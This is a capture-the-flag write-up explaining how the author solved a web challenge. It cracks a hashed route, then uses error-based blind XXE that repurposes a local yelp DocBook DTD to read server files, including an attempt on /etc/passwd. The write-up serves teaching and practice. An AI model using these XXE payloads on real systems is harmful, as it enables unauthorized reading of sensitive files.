# Secret Santa

On viewing the website, we are given a clue that the route is with the bots. Hence, examining `/robots.txt` we get:

```
The 512th route to your secret santa is d21023fb2949d11633959fa17135894b973c9516aa3b088f5e1fe0c0425c1f746377ff99bf674628e54dd37d99d04649f9bb621f34894be3daf4cf60484088c8
```

which is a clear indication that the route is hashed with sha512 hash, cracking the hash in [crackstation](https://crackstation.net/), we get the route,

```
pragyan
```

Now if we visit the page `/pragyan`, we see some content written about XML, which indicates a  possible XML Vulnerability. We get the backend route for our exploit by just looking at the requests that are being sent when we load the page, where we find that some sample json is being sent to `you_know_who` route.

```
{
    "message":"hi"
}
```

By Sending sample json we get the error message:

```
This data format is not supported for your gift
```

Now, if we try sending sample XML data like this,

```
<gift>Hi</gift>
```

We get an error saying:

```
Validation failed: no DTD found !, line 1, column 6 (
<string>, line 1)
```

Which implies that it accepts XML only with DTD.

Now, lets try to send a payload with a Doctype,

```
<!DOCTYPE message [
    <!ELEMENT message (#PCDATA)>
    <!ENTITY id 'hello'>
]>
<message>&id;</message>
```

which returns,

```
Sorry, the XML parser didn't return anything

```
which means the XML parser broke while parsing our DTD, lets now try to load an external url,

```
<!DOCTYPE gift [
    <!ENTITY % dtd SYSTEM "https://www.google.com/">
    %dtd;
]>

```

we get the error message:

```
failed to load external entity "https://www.google.com/", line 4, column 10 (
<string>, line 4)
```

But if we try to load internal resources like /etc/passwd, we get the error,

```
internal error: xmlParseInternalSubset: error detected in Markup declaration
, line 1, column 1 (passwd, line 1)
```

which indicates that the file was loaded properly, but couldn't be displayed due to some markup error.

This could be exploited by performing an Out of Band XXE attack using local dtds, because we were unable to load external dtds, but the xml parser was able to parse local files. We also got back the external resource name, when the XML parser tried to load it, which can be exploited to perform a blind XXE.

If we tried to read any other local dtds other than the one at yelp, we get the error,

```

I know you've all survived the biggest apocalypse, but you need to survive the yelpocalypse
```

which forces us to use the dtd only from yelp.

We can use any external entity available in docboox.dtd to craft our exploit.
So, first we tried to read the file that we want, and then we tried to read another file whose name would be the contents of the first file. Since there is no file with the name as the contents of the first file, we get an error message with the file name, and hence we get the contents of the first file and we get Arbitrary File Read via blind XXE.

So, our final payload would be,

```
<!DOCTYPE wonder [
    <!ENTITY % dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///gift">
        <!ENTITY &#x25; ent1 "<!ENTITY &#x26;#x25; ent2 SYSTEM &#x27;file:///dummy/&#x25;file;&#x27;>">
        &#x25;ent1;
        &#x25;ent2;
    '>

    %dtd;
]>
<wonder>CTFs are cool</wonder>
```

On sending this payload, the server returns the flag

```
p_ctf{heR3_iS_Y0ur_9Ift}
```
